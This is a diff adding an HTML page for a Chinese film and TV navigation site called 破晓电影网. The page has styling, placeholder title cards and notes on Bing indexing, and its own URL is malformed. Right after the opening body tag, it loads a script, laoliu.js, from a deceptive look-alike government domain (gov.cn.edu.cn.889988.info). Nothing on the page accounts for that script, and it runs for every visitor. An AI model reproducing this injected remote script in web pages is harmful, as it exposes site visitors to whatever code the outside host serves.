@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>破晓电影网 - 电影/剧集/综艺动漫在线导航 | poxiaodianyingwang-h5</title>
+<meta name="description" content="破晓电影网（poxiao dianyingwang-h5）提供电影、热播剧集、综艺动漫分类导航，晨曦青蓝风、移动端自适应，结构干净，适合必应搜索引擎快速收录与排名。">
+<meta name="keywords" content="破晓电影网, poxiaodianyingwang-h5, 电影导航, 热播剧集, 综艺动漫, 影视资讯">
+<meta name="author" content="破晓电影网">
+<meta name="robots" content="index,follow">
+<!-- <meta name="msvalidate.01" content="必应站长验证码" /> -->
+<style>
+:root{
+  --dawn-blue:#0c8ec7;
+  --dawn-light:#4ecdc4;
+  --sunrise-gold:#ffd166;
+  --sunrise-warm:#ff9a5c;
+  --ink:#0a1628;
+  --paper:#f0f7ff;
+  --card-bg:#ffffff;
+  --muted:#6b829e;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper); color:var(--ink); line-height:1.75;
+}
+a{ color:var(--dawn-blue); text-decoration:none; transition:.25s; }
+a:hover{ color:var(--sunrise-warm); }
+
+/* 导航 */
+.header{
+  background:linear-gradient(120deg,#0a4a7a,#0c8ec7);
+  position:sticky; top:0; z-index:999; border-bottom:1px solid rgba(78,205,196,.3);
+  box-shadow:0 2px 12px rgba(12,142,199,.2);
+}
+.nav{
+  max-width:1180px; margin:0 auto; padding:.9rem 1rem;
+  display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap;
+}
+.brand{ font-size:1.4rem; font-weight:800; color:#d6f0ff; }
+.brand b{ color:var(--sunrise-gold); }
+.menu{ list-style:none; display:flex; gap:1.1rem; flex-wrap:wrap; }
+.menu a{ color:#c8e8ff; font-size:.95rem; padding:.3rem 0; border-bottom:2px solid transparent; }
+.menu a:hover{ border-bottom-color:var(--sunrise-gold); color:#fff; }
+
+/* 横幅 */
+.hero{
+  padding:4.6rem 1rem 3.4rem; text-align:center; color:#fff;
+  background:
+    radial-gradient(800px 360px at 20% 15%, rgba(255,209,102,.25), transparent),
+    radial-gradient(760px 360px at 80% 20%, rgba(78,205,196,.3), transparent),
+    linear-gradient(160deg,#0a4a7a,#0c8ec7 50%,#4ecdc4);
+}
+.hero h1{ font-size:2.1rem; margin-bottom:.8rem; }
+.hero h1 b{ color:var(--sunrise-gold); }
+.hero p{ max-width:660px; margin:0 auto 1.6rem; color:#d6f0ff; }
+.btn{
+  display:inline-block; padding:.78rem 2.1rem; border-radius:40px;
+  background:linear-gradient(45deg,var(--sunrise-gold),var(--sunrise-warm));
+  color:#1a0e02; font-weight:800;
+}
+.btn:hover{ color:#1a0e02; transform:translateY(-2px); box-shadow:0 6px 20px rgba(255,209,102,.4); }
+
+/* 区块 */
+.section{ max-width:1180px; margin:0 auto; padding:3rem 1rem; }
+.section h2{ text-align:center; font-size:1.7rem; margin-bottom:1.8rem; color:var(--ink); }
+.section h2 span{ color:var(--dawn-blue); }
+
+/* 卡片 */
+.grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:1.2rem; }
+.card{
+  background:var(--card-bg); border-radius:16px; overflow:hidden;
+  box-shadow:0 6px 18px rgba(12,142,199,.1); transition:.3s;
+  border:1px solid rgba(12,142,199,.08);
+}
+.card:hover{ transform:translateY(-6px); box-shadow:0 14px 32px rgba(12,142,199,.2); }
+.poster{
+  height:212px; display:flex; align-items:center; justify-content:center;
+  font-size:3.2rem; color:#fff;
+  background:linear-gradient(135deg,var(--c1,var(--dawn-blue)),var(--c2,var(--dawn-light)));
+}
+.d1{ --c1:#0c8ec7; --c2:#4ecdc4; }
+.d2{ --c1:#ffd166; --c2:#ff9a5c; }
+.d3{ --c1:#4ecdc4; --c2:#44a8b3; }
+.d4{ --c1:#0a4a7a; --c2:#0c8ec7; }
+.d5{ --c1:#ff9a5c; --c2:#ff6b6b; }
+.d6{ --c1:#3aa0e0; --c2:#7ed8c5; }
+.card-body{ padding:.9rem 1rem; }
+.card-body h3{ font-size:.98rem; margin-bottom:.3rem; color:var(--ink); }
+.card-body small{ color:var(--muted); }
+
+/* 标签 */
+.tags{ display:flex; flex-wrap:wrap; gap:.6rem; justify-content:center; margin-bottom:1.8rem; }
+.tag{
+  background:#fff; border:1px solid rgba(12,142,199,.25); color:#0a6a9a;
+  padding:.35rem 1rem; border-radius:30px; font-size:.82rem;
+}
+.tag:hover{ background:var(--dawn-blue); color:#fff; border-color:var(--dawn-blue); }
+
+/* 关于 */
+.about{
+  background:#fff; border-radius:16px; padding:2rem;
+  box-shadow:0 6px 18px rgba(12,142,199,.1);
+  border:1px solid rgba(12,142,199,.08);
+}
+.about h3{ color:var(--dawn-blue); margin:1rem 0 .5rem; }
+.about p{ color:#4a6078; margin-bottom:.8rem; }
+
+/* 底部 */
+.footer{
+  background:#0a1628; text-align:center; padding:2rem 1rem;
+  color:#7a93b0; font-size:.85rem; border-top:1px solid #142a4a;
+}
+.footer a{ color:var(--sunrise-gold); }
+
+/* 移动端 */
+@media (max-width:768px){
+  .nav{ flex-direction:column; gap:.6rem; }
+  .menu{ justify-content:center; gap:.8rem; }
+  .hero h1{ font-size:1.6rem; }
+  .grid{ grid-template-columns:repeat(2,1fr); }
+  .poster{ height:168px; font-size:2.4rem; }
+  .section{ padding:2.2rem 1rem; }
+  .about{ padding:1.4rem; }
+}
+@media (max-width:420px){
+  .grid{ gap:.8rem; }
+  .hero{ padding:3rem 1rem; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="header">
+  <div class="nav">
+    <div class="brand">🌅 破晓<b>电影网</b></div>
+    <ul class="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movie">破晓电影</a></li>
+      <li><a href="#tv">热播剧集</a></li>
+      <li><a href="#show">综艺动漫</a></li>
+      <li><a href="#about">关于破晓</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+<section class="hero" id="home">
+  <h1>破晓电影网｜每天第一缕光影，从这里开始</h1>
+  <p>
+    破晓电影网（https://poxiao dianyingwang-h5）做电影、热播剧集、综艺动漫的分类导航，
+    晨曦青蓝风、手机自适应、锚点分区，单页也能让必应爬虫一眼识别"这是影视导航站"。
+  </p>
+  <a class="btn" href="#movie">迎接破晓片单</a>
+</section>
+
+<section class="section" id="movie">
+  <h2>🎬 <span>破晓电影</span> 片单</h2>
+  <div class="tags">
+    <span class="tag">新片速递</span><span class="tag">剧情</span><span class="tag">喜剧</span>
+    <span class="tag">悬疑</span><span class="tag">动画</span><span class="tag">科幻</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster d1">🎥</div><div class="card-body"><h3>奥本海默</h3><small>2023 · 传记/历史</small></div></article>
+    <article class="card"><div class="poster d2">🎥</div><div class="card-body"><h3>芭比</h3><small>2023 · 喜剧/奇幻</small></div></article>
+    <article class="card"><div class="poster d3">🎥</div><div class="card-body"><h3>坠落的审判</h3><small>2023 · 悬疑/剧情</small></div></article>
+    <article class="card"><div class="poster d4">🎥</div><div class="card-body"><h3>哥斯拉大战金刚2</h3><small>2024 · 科幻/动作</small></div></article>
+    <article class="card"><div class="poster d5">🎥</div><div class="card-body"><h3>你想活出怎样的人生</h3><small>2023 · 动画/奇幻</small></div></article>
+    <article class="card"><div class="poster d6">🎥</div><div class="card-body"><h3>飞驰人生2</h3><small>2024 · 喜剧/运动</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:#e8f4ff;">
+  <h2>📺 <span>热播剧集</span></h2>
+  <div class="tags">
+    <span class="tag">国产剧</span><span class="tag">都市</span><span class="tag">古装</span>
+    <span class="tag">悬疑</span><span class="tag">台剧</span><span class="tag">美剧</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster d1">📺</div><div class="card-body"><h3>南来北往</h3><small>2024 · 年代/剧情</small></div></article>
+    <article class="card"><div class="poster d2">📺</div><div class="card-body"><h3>与凤行</h3><small>2024 · 古装/仙侠</small></div></article>
+    <article class="card"><div class="poster d3">📺</div><div class="card-body"><h3>墨雨云间</h3><small>2024 · 古装/复仇</small></div></article>
+    <article class="card"><div class="poster d4">📺</div><div class="card-body"><h3>城中之城</h3><small>2024 · 都市/金融</small></div></article>
+    <article class="card"><div class="poster d5">📺</div><div class="card-body"><h3>不够善良的我们</h3><small>2024 · 台剧/情感</small></div></article>
+    <article class="card"><div class="poster d6">📺</div><div class="card-body"><h3>企鹅人</h3><small>2024 · 美剧/犯罪</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="show">
+  <h2>🎤 <span>综艺 / 动漫</span></h2>
+  <div class="tags">
+    <span class="tag">真人秀</span><span class="tag">音乐</span><span class="tag">文化</span>
+    <span class="tag">国漫</span><span class="tag">日漫</span><span class="tag">院线动画</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster d1">🎤</div><div class="card-body"><h3>乘风2024</h3><small>综艺/竞演</small></div></article>
+    <article class="card"><div class="poster d2">🎤</div><div class="card-body"><h3>大侦探9</h3><small>综艺/推理</small></div></article>
+    <article class="card"><div class="poster d3">🎤</div><div class="card-body"><h3>花儿与少年6</h3><small>综艺/旅行</small></div></article>
+    <article class="card"><div class="poster d4">🎤</div><div class="card-body"><h3>时光代理人 第二季</h3><small>国漫/悬疑</small></div></article>
+    <article class="card"><div class="poster d5">🎤</div><div class="card-body"><h3>牧神记</h3><small>国漫/玄幻</small></div></article>
+    <article class="card"><div class="poster d6">🎤</div><div class="card-body"><h3>蓦然回首</h3><small>动画/治愈</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="about" style="background:#e8f4ff;">
+  <h2>ℹ️ 关于 <span>破晓电影网</span></h2>
+  <div class="about">
+    <h3>站点定位</h3>
+    <p>
+      破晓电影网（网址：<a href="https://poxiao dianyingwang-h5">https://poxiao dianyingwang-h5</a>）
+      是影视分类导航单页站，覆盖电影、剧集、综艺动漫与影视资讯，
+      只做"片单 + 分类 + 入口"的轻量展示，不提供盗版播放。
+    </p>
+    <h3>必应收录逻辑</h3>
+    <p>
+      单页站核心是"主题集中"：唯一 H1 写主词"破晓电影网"，H2 切虚拟栏目，
+      锚点 <code>#movie</code> <code>#tv</code> <code>#show</code> 形成内部分区，
+      纯静态内联 CSS，移动端无横向滚动，必应爬虫能直接读正文、判主题。
+    </p>
+    <h3>上线提醒</h3>
+    <p>
+      内链当前用 <code>#</code> 占位，不生成 robots.txt / sitemap.xml；
+      正式上线请使用备案域名、HTTPS、正版授权片源，并在必应站长工具验证提交。
+    </p>
+  </div>
+</section>
+</main>
+
+<footer class="footer">
+  <p>© 2026 破晓电影网（poxiao dianyingwang-h5）· 电影 / 剧集 / 综艺动漫导航站</p>
+  <p>网址：<a href="https://poxiao dianyingwang-h5">https://poxiao dianyingwang-h5</a></p>
+  <p>关键词：破晓电影网、poxiao dianyingwang-h5、电影导航、热播剧集、综艺动漫</p>
+  <p style="margin-top:.8rem;color:#5a7596;">单页演示 · 内页链接以 # 替代 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
